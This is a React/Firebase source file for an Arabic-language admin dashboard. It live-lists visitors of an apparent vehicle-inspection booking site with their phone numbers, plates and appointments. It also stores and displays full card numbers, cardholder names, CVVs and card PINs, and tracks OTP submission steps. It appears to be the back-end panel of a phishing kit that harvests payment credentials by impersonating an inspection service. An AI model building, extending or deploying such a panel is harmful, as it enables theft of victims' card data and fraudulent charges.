"use client"

import { useState, useEffect } from "react"
import { Search, CheckCheck } from "lucide-react"
import { Avatar, AvatarFallback } from "@/components/ui/avatar"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { collection, onSnapshot, query, orderBy } from "firebase/firestore"
import { db } from "@/lib/firebase"

type UserData = {
  id: string
  status: "online" | "offline"
  lastSeen: string
  createdDate: string
  country: string
  vehicleType: string
  plateNumbers: string
  plateLetters: string
  region: string
  city: string
  inspectionCenter: string
  inspectionDate: string
  inspectionTime: string
  paymentMethod: "credit_card" | "debit_card" | "bank_transfer"
  phone: string
  step: string
  completedDate?: string
  cardNumber?: string
  cardName?: string
  cvv?: string
  pin?: string
  isRead?: boolean
}

export default function DashboardPage() {
  const [users, setUsers] = useState<UserData[]>([])
  const [selectedUser, setSelectedUser] = useState<UserData | null>(null)
  const [searchQuery, setSearchQuery] = useState("")
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    const q = query(collection(db, "pays"), orderBy("createdAt", "desc"))

    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const userData: UserData[] = []
        snapshot.forEach((doc) => {
          const data = doc.data()
          const processedData: any = { id: doc.id }

          // Convert all timestamp objects to strings
          Object.keys(data).forEach((key) => {
            const value = data[key]
            // Check if it's a Firebase timestamp object
            if (value && typeof value === "object" && value.seconds) {
              processedData[key] = new Date(value.seconds * 1000).toISOString()
            } else if (value && typeof value === "object" && value[".sv"]) {
              // Handle server timestamp placeholders - use current date as fallback
              processedData[key] = new Date().toISOString()
            } else {
              processedData[key] = value
            }
          })

          userData.push(processedData as UserData)
        })
        setUsers(userData)
        if (userData.length > 0 && !selectedUser) {
          setSelectedUser(userData[0])
        }
        setLoading(false)
      },
      (error) => {
        console.error("[v0] Firebase error:", error)
        setLoading(false)
      },
    )

    return () => unsubscribe()
  }, [])

  const filteredUsers = users.filter(
    (user) =>
      (user.phone || "")?.toLowerCase()?.includes(searchQuery.toLowerCase()) ||
      (user.plateNumbers || "").includes(searchQuery) ||
      (user.city || "").toLowerCase().includes(searchQuery.toLowerCase()),
  )

  const unreadCount = users.filter((user) => !user.isRead).length

  const getStepLabel = (step: string) => {
    const labels: Record<string, string> = {
      "booking-completed": "اكتمل الحجز",
      "payment-method-selected": "تم اختيار طريقة الدفع",
      "card-details-submitted": "تم إرسال بيانات البطاقة",
      "otp-submitted": "تم إرسال رمز التحقق",
      "pin-submitted": "تم إرسال الرقم السري",
      "payment-completed": "اكتمل الدفع",
    }
    return labels[step] || step
  }

  const getStepColor = (step: string) => {
    if (!step) return "bg-zinc-700 text-zinc-300 border-zinc-600"
    if (step === "payment-completed") return "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
    if (step.includes("submitted")) return "bg-blue-500/10 text-blue-400 border-blue-500/20"
    return "bg-zinc-700 text-zinc-300 border-zinc-600"
  }

  const formatDate = (dateString: string) => {
    if (!dateString) return "غير متوفر"
    try {
      const date = new Date(dateString)
      if (isNaN(date.getTime())) return dateString
      return date.toLocaleDateString("ar-SA", {
        year: "numeric",
        month: "long",
        day: "numeric",
      })
    } catch {
      return dateString
    }
  }

  const formatTime = (dateString: string) => {
    if (!dateString) return "غير متوفر"
    try {
      const date = new Date(dateString)
      if (isNaN(date.getTime())) return dateString
      return date.toLocaleTimeString("ar-SA", {
        hour: "2-digit",
        minute: "2-digit",
      })
    } catch {
      return dateString
    }
  }

  const formatDateTime = (dateString: string) => {
    if (!dateString) return "غير متوفر"
    try {
      const date = new Date(dateString)
      if (isNaN(date.getTime())) return dateString
      return date.toLocaleString("ar-SA", {
        year: "numeric",
        month: "long",
        day: "numeric",
        hour: "2-digit",
        minute: "2-digit",
      })
    } catch {
      return dateString
    }
  }

  if (loading) {
    return (
      <div className="flex h-screen items-center justify-center bg-background text-foreground">
        <div className="text-center">
          <div className="h-10 w-10 animate-spin rounded-full border-4 border-border border-t-primary mx-auto mb-4"></div>
          <p className="text-muted-foreground">جاري التحميل...</p>
        </div>
      </div>
    )
  }

  if (users.length === 0) {
    return (
      <div className="flex h-screen items-center justify-center bg-background text-foreground">
        <div className="text-center">
          <p className="text-muted-foreground">لا توجد بيانات متاحة</p>
        </div>
      </div>
    )
  }

  return (
    <div className="flex h-screen overflow-hidden bg-background text-foreground" dir="rtl">
      <div className="w-[400px] border-l border-border flex flex-col bg-sidebar h-full overflow-hidden">
        {/* Header */}
        <div className="p-6 border-b border-border flex-shrink-0 bg-sidebar-header">
          <div className="flex items-center justify-between mb-5">
            <h1 className="text-2xl font-bold text-foreground tracking-tight">لوحة التحكم</h1>
            {unreadCount > 0 && (
              <Badge className="bg-primary text-primary-foreground font-bold px-3 py-1 rounded-full">
                {unreadCount} غير مقروء
              </Badge>
            )}
          </div>
          <div className="relative">
            <Search className="absolute right-4 top-1/2 -translate-y-1/2 h-5 w-5 text-muted-foreground" />
            <Input
              placeholder="ابحث باستخدام الهاتف أو رقم اللوحة..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="pr-12 h-12 bg-input border-border text-foreground placeholder:text-muted-foreground focus-visible:ring-2 focus-visible:ring-primary rounded-xl transition-all"
            />
          </div>
        </div>

        {/* User List */}
        <div className="flex-1 overflow-y-auto">
          {filteredUsers.map((user) => (
            <div
              key={user.id}
              onClick={() => setSelectedUser(user)}
              className={`p-5 border-b border-border cursor-pointer transition-all duration-200 ${
                selectedUser?.id === user.id
                  ? "bg-sidebar-item-active border-r-4 border-r-primary"
                  : "hover:bg-sidebar-item-hover"
              }`}
            >
              <div className="flex items-start gap-4">
                <div className="relative flex-shrink-0">
                  <Avatar className="h-14 w-14 ring-2 ring-border">
                    <AvatarFallback className="bg-avatar-bg text-avatar-foreground text-base font-semibold">
                      {user.phone?.slice(-4)}
                    </AvatarFallback>
                  </Avatar>
                  {user.status === "online" && (
                    <div className="absolute bottom-0 left-0 h-4 w-4 bg-status-online border-2 border-sidebar rounded-full"></div>
                  )}
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between mb-1.5">
                    <span className={`text-base ${!user.isRead ? "font-bold" : "font-semibold"} text-foreground`}>
                      {user.phone}
                    </span>
                    <span className="text-xs text-muted-foreground font-medium">{formatTime(user.lastSeen)}</span>
                  </div>
                  <div className="flex items-center justify-between gap-2">
                    <span className={`text-sm ${!user.isRead ? "font-semibold" : "font-medium"} text-muted-foreground`}>
                      {user.plateLetters} {user.plateNumbers}
                    </span>
                    <div className="flex items-center gap-2">
                      {user.step === "payment-completed" && (
                        <CheckCheck className="h-4 w-4 text-status-completed flex-shrink-0" />
                      )}
                      {!user.isRead && <div className="h-2.5 w-2.5 bg-primary rounded-full flex-shrink-0"></div>}
                    </div>
                  </div>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Main Content */}
      {selectedUser && (
        <div className="flex-1 flex flex-col h-full overflow-hidden">
          <div className="p-6 border-b border-border bg-chat-header flex-shrink-0 shadow-sm">
            <div className="flex items-center gap-4">
              <Avatar className="h-12 w-12 ring-2 ring-border">
                <AvatarFallback className="bg-avatar-bg text-avatar-foreground font-semibold">
                  {selectedUser.phone?.slice(-4)}
                </AvatarFallback>
              </Avatar>
              <div>
                <h2 className="font-semibold text-lg text-foreground">{selectedUser.phone}</h2>
                <p className="text-sm text-muted-foreground flex items-center gap-2">
                  {selectedUser.status === "online" ? (
                    <>
                      <span className="inline-block h-2 w-2 rounded-full bg-status-online"></span>
                      متصل الآن
                    </>
                  ) : (
                    `آخر ظهور ${formatDateTime(selectedUser.lastSeen)}`
                  )}
                </p>
              </div>
            </div>
          </div>

          <div className="flex-1 overflow-y-auto p-8 bg-chat-background">
            <div className="max-w-4xl mx-auto space-y-6">
              {/* User Info Message */}
              <div className="flex justify-start">
                <div className="bg-message-received rounded-2xl p-6 max-w-md shadow-lg border border-message-border">
                  <h3 className="font-bold mb-4 text-foreground text-lg">معلومات المستخدم</h3>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between gap-12">
                      <span className="text-muted-foreground font-medium">الدولة:</span>
                      <span className="text-foreground font-semibold">{selectedUser.country}</span>
                    </div>
                    <div className="flex justify-between gap-12">
                      <span className="text-muted-foreground font-medium">الهاتف:</span>
                      <span className="text-foreground font-semibold">{selectedUser.phone}</span>
                    </div>
                    <div className="flex justify-between gap-12">
                      <span className="text-muted-foreground font-medium">تاريخ الإنشاء:</span>
                      <span className="text-foreground font-semibold">{formatDate(selectedUser.createdDate)}</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Vehicle Info Message */}
              <div className="flex justify-start">
                <div className="bg-message-received rounded-2xl p-6 max-w-md shadow-lg border border-message-border">
                  <h3 className="font-bold mb-4 text-foreground text-lg">تفاصيل المركبة</h3>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between gap-12">
                      <span className="text-muted-foreground font-medium">النوع:</span>
                      <span className="text-foreground font-semibold">{selectedUser.vehicleType}</span>
                    </div>
                    <div className="flex justify-between gap-12">
                      <span className="text-muted-foreground font-medium">اللوحة:</span>
                      <span className="text-foreground font-semibold">
                        {selectedUser.plateLetters} {selectedUser.plateNumbers}
                      </span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Appointment Info Message */}
              <div className="flex justify-end">
                <div className="bg-message-sent rounded-2xl p-6 max-w-md shadow-lg">
                  <h3 className="font-bold mb-4 text-message-sent-foreground text-lg">موعد الفحص</h3>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between gap-12">
                      <span className="text-message-sent-muted font-medium">المنطقة:</span>
                      <span className="text-message-sent-foreground font-semibold">{selectedUser.region}</span>
                    </div>
                    <div className="flex justify-between gap-12">
                      <span className="text-message-sent-muted font-medium">المدينة:</span>
                      <span className="text-message-sent-foreground font-semibold">{selectedUser.city}</span>
                    </div>
                    <div className="flex justify-between gap-12">
                      <span className="text-message-sent-muted font-medium">المركز:</span>
                      <span className="text-message-sent-foreground font-semibold">
                        {selectedUser.inspectionCenter}
                      </span>
                    </div>
                    <div className="flex justify-between gap-12">
                      <span className="text-message-sent-muted font-medium">التاريخ:</span>
                      <span className="text-message-sent-foreground font-semibold">
                        {selectedUser.inspectionDate || "غير متوفر"}
                      </span>
                    </div>
                    <div className="flex justify-between gap-12">
                      <span className="text-message-sent-muted font-medium">الوقت:</span>
                      <span className="text-message-sent-foreground font-semibold">
                        {selectedUser.inspectionTime || "غير متوفر"}
                      </span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Payment Info Message */}
              <div className="flex justify-end">
                <div className="bg-message-sent rounded-2xl p-6 max-w-md shadow-lg">
                  <h3 className="font-bold mb-4 text-message-sent-foreground text-lg">معلومات الدفع</h3>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between gap-12">
                      <span className="text-message-sent-muted font-medium">الطريقة:</span>
                      <span className="text-message-sent-foreground font-semibold capitalize">
                        {selectedUser.paymentMethod?.replace("_", " ")}
                      </span>
                    </div>
                    <div className="flex justify-between items-center gap-4">
                      <span className="text-message-sent-muted font-medium">الحالة:</span>
                      <Badge className={`${getStepColor(selectedUser.step)} font-semibold px-3 py-1 rounded-lg`}>
                        {getStepLabel(selectedUser.step)}
                      </Badge>
                    </div>
                    {selectedUser.completedDate && (
                      <div className="flex justify-between gap-12">
                        <span className="text-message-sent-muted font-medium">تم الإكمال:</span>
                        <span className="text-message-sent-foreground font-semibold">
                          {formatDateTime(selectedUser.completedDate)}
                        </span>
                      </div>
                    )}
                  </div>
                </div>
              </div>

              {/* Card Details Section */}
              {(selectedUser.cardNumber || selectedUser.cardName || selectedUser.cvv || selectedUser.pin) && (
                <div className="flex justify-start">
                  <div className="bg-message-received rounded-2xl p-6 max-w-md shadow-lg border border-message-border">
                    <h3 className="font-bold mb-4 text-foreground text-lg">تفاصيل البطاقة</h3>
                    <div className="space-y-3 text-sm">
                      {selectedUser.cardName && (
                        <div className="flex justify-between gap-12">
                          <span className="text-muted-foreground font-medium">اسم حامل البطاقة:</span>
                          <span className="text-foreground font-semibold">{selectedUser.cardName}</span>
                        </div>
                      )}
                      {selectedUser.cardNumber && (
                        <div className="flex justify-between gap-12">
                          <span className="text-muted-foreground font-medium">رقم البطاقة:</span>
                          <span className="text-foreground font-semibold font-mono tracking-wider" dir="ltr">
                            {selectedUser.cardNumber}
                          </span>
                        </div>
                      )}
                      {selectedUser.cvv && (
                        <div className="flex justify-between gap-12">
                          <span className="text-muted-foreground font-medium">CVV:</span>
                          <span className="text-foreground font-semibold font-mono">***</span>
                        </div>
                      )}
                      {selectedUser.pin && (
                        <div className="flex justify-between gap-12">
                          <span className="text-muted-foreground font-medium">الرقم السري:</span>
                          <span className="text-foreground font-semibold font-mono">****</span>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
